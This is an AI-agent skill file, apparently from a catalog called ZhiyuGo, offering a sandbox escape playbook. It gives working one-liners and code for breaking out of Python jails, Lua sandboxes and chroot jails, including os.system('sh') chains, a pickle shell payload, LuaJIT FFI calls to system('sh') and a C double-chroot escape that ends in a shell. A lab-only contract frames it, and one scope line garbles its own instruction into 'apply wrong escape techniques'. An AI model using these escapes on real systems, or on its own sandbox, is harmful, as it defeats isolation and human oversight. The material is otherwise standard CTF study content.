---
name: sandbox-escape-techniques
description: >-
  Sandbox escape playbook. Use when breaking out of Python sandbox, Lua sandbox, seccomp filter, chroot jail, container/Docker, browser sandbox, or namespace isolation to achieve unrestricted code execution or file access.
---

# SKILL: Sandbox Escape — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert sandbox escape techniques across Python, Lua, seccomp, chroot, Docker/container, and browser sandbox contexts. Covers CTF pyjail patterns, seccomp architecture confusion, chroot fd leaks, namespace escape, and Mojo IPC abuse. Distilled from ctf-wiki sandbox sections and real-world container escapes. Pay particular attention to the distinction between sandbox types and apply wrong escape techniques.

## 0. RELATED ROUTING

- `browser-exploitation-v8` — V8 exploitation for renderer RCE before browser sandbox escape
- `container-escape-techniques` — Docker/container specific escape techniques
- `kernel-exploitation` — kernel exploit for container/namespace escape
- `linux-privilege-escalation` — post-escape privilege escalation

### Advanced References

- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) — Full pyjail methodology: `__builtins__` recovery, keyword bypass, AST bypass, pickle escape
- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) — Architecture confusion, io_uring bypass, ptrace bypass, allowed syscall chaining

---

## 1. SANDBOX TYPE IDENTIFICATION

| Sandbox Type | Indicators | Typical Context |
|---|---|---|
| Python sandbox (pyjail) | Limited builtins, filtered keywords, `exec`/`eval` available | CTF, online judges, Jupyter |
| Lua sandbox | No `os`, `io` modules; restricted metatables | Game scripting, config |
| seccomp | syscall filtering, `prctl(PR_SET_SECCOMP)` | CTF pwn, container hardening |
| chroot | Changed root filesystem, limited `/proc` access | Legacy isolation |
| Docker/container | Namespaces, cgroups, reduced capabilities | Cloud, microservices |
| Browser (renderer) | OS-level sandbox (seccomp-bpf + namespaces on Linux) | Chrome, Firefox |
| Namespace isolation | PID/mount/network/user namespace | Container runtimes |

---

## 2. PYTHON SANDBOX ESCAPE (OVERVIEW)

See [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) for full methodology.

### Quick Reference

| Technique | One-Liner |
|---|---|
| Subclass walk | `().__class__.__bases__[0].__subclasses__()` → find `os._wrap_close` → `__init__.__globals__['system']` |
| Import recovery | `__builtins__.__import__('os').system('sh')` |
| getattr bypass | `getattr(getattr(__builtins__, '__imp'+'ort__'), '__call__')('os')` |
| chr construction | `eval(chr(95)+chr(95)+'import'+chr(95)+chr(95))` |
| Pickle escape | `pickle.loads(b"cos\nsystem\n(S'sh'\ntR.")` |
| Code object | Construct `types.CodeType(...)` then `exec()` with custom bytecode |

---

## 3. LUA SANDBOX ESCAPE

### Restricted Environment Bypass

```lua
-- If debug library available:
debug.getinfo(1)                    -- information leakage
debug.getregistry()                 -- access global registry
debug.getupvalue(func, 1)           -- read closed-over variables
debug.setupvalue(func, 1, new_val)  -- overwrite upvalues

-- Recover os module via debug:
local getupvalue = debug.getupvalue
-- Walk upvalues of known functions to find references to os/io

-- If loadstring available:
loadstring("os.execute('sh')")()

-- If string.dump available:
-- Dump function bytecode, patch it, load modified function

-- Metatables escape:
-- If rawset/rawget blocked but __index/__newindex exists:
-- Forge metatable chain to access restricted globals
```

### Lua FFI Escape (LuaJIT)

```lua
-- LuaJIT FFI provides C function access
local ffi = require("ffi")
ffi.cdef[[ int system(const char *command); ]]
ffi.C.system("sh")

-- If require is blocked but ffi is preloaded:
-- Find ffi via package.loaded or debug.getregistry
```

---

## 4. CHROOT ESCAPE

| Technique | Condition | Method |
|---|---|---|
| Open fd to real root | File descriptor leaked from outside chroot | `fchdir(leaked_fd)` then `chroot(".")` |
| Double chroot | Process is root inside chroot | `mkdir("x"); chroot("x"); chdir("../../../..")` |
| TIOCSTI ioctl | Terminal access (fd 0 is a TTY) | Inject keystrokes to parent shell via `ioctl(0, TIOCSTI, &c)` |
| /proc access | `/proc` mounted inside chroot | `/proc/1/root/` → access real root filesystem |
| ptrace | CAP_SYS_PTRACE | Attach to process outside chroot |
| Mount namespace | Privileged | Mount real root into chroot |

### Double Chroot Escape

```c
// Must be root inside chroot
mkdir("/tmp/escape", 0755);
chroot("/tmp/escape");          // new chroot inside old chroot
// Old CWD is now outside the new chroot
// Navigate up to real root:
for (int i = 0; i < 100; i++) chdir("..");
chroot(".");                     // now at real root
execl("/bin/sh", "sh", NULL);
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. BROWSER SANDBOX ESCAPE (OVERVIEW)
- 6. NAMESPACE ESCAPE
- 7. RBASH / RESTRICTED SHELL ESCAPE
- 8. DECISION TREE
